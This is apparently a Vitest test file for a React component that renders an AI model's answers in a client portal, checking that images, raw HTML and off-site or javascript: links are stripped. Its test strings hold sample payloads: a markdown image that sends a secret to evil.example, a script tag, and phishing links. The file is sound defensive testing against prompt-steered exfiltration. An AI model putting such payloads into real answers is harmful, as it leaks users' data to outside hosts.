import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { AssistantMarkdown } from './assistant-markdown';

/**
 * Answer text comes from a model, and a model can be steered by what a client
 * typed. These are the rules that keep a steered answer harmless in the browser.
 */
describe('AssistantMarkdown', () => {
  it('never renders an image, so an answer cannot make the browser fetch a URL', () => {
    const { container } = render(
      <AssistantMarkdown text={'Look: ![x](https://evil.example/leak?q=secret) done'} />,
    );
    expect(container.querySelector('img')).toBeNull();
  });

  it('drops raw HTML instead of rendering it', () => {
    const { container } = render(
      <AssistantMarkdown text={'<img src="https://evil.example/x"><script>alert(1)</script>Hi'} />,
    );
    expect(container.querySelector('img, script')).toBeNull();
  });

  it('turns only allowed portal pages into links', () => {
    const { container } = render(
      <AssistantMarkdown
        text={
          '[Open Deposit](/deposit) [History](/deposit?tab=history) ' +
          '[Phish](https://evil.example) [Proto](//evil.example) [JS](javascript:alert(1)) ' +
          '[Unknown](/admin)'
        }
      />,
    );
    const hrefs = [...container.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(['/deposit', '/deposit?tab=history']);
    // The refused links still show their words, as plain text.
    expect(container.textContent).toContain('Phish');
    expect(container.textContent).toContain('Unknown');
  });
});
